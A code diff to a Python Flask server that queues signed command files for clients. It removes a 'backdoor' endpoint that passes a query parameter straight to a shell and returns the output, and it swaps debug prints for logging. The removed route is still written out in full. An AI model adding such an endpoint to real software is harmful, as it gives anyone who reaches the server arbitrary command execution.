@@ -7,7 +7,6 @@ import time
 import tempfile
 import logging
 import javaobj
-import subprocess
 
 from Crypto.Signature import DSS
 from Crypto.PublicKey import DSA
@@ -92,14 +91,6 @@ def checkin():
     return Response(command, 200)
 
 
-@app.route(PREFIX + "backdoor")
-def backdoor():
-    command = request.args.get("command")
-    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE).stdout.decode("utf-8")
-
-    return Response(output, 200)
-
-
 @app.route(PREFIX + "list")
 def admin():
     with get_db() as db:
@@ -140,7 +131,6 @@ def commands(client_id):
 
 @app.route(PREFIX + "<client_id>/commands", methods=["POST"])
 def add_command(client_id):
-    start_time = time.time()
     upload_file = request.files.get("file", None)
     if not upload_file:
         logger.warning("missing file argument")
@@ -149,20 +139,17 @@ def add_command(client_id):
     with tempfile.NamedTemporaryFile(dir=WORKSPACE) as f:
         command_file = f.name
         upload_file.save(command_file)
-        print(f"Time taken for file upload: {time.time() - start_time} seconds")
 
         try:
             obj = Command(f)
             obj.verify()
-            print(f"Time taken for command verification: {time.time() - start_time} seconds")
-            print(obj.__str__())
-            print(f"registering new command for client {client_id}")
+
+            logger.info(f"registering new command for client {client_id}")
             add_command_to_db(client_id, obj.run_after, command_file)
-            print(f"Time taken for database insertion: {time.time() - start_time} seconds")
             return Response(f"OK\n", 200)
 
         except:
-            print("invalid command or signature")
+            logger.exception("invalid command or signature")
             return Response("", 400)
 
 
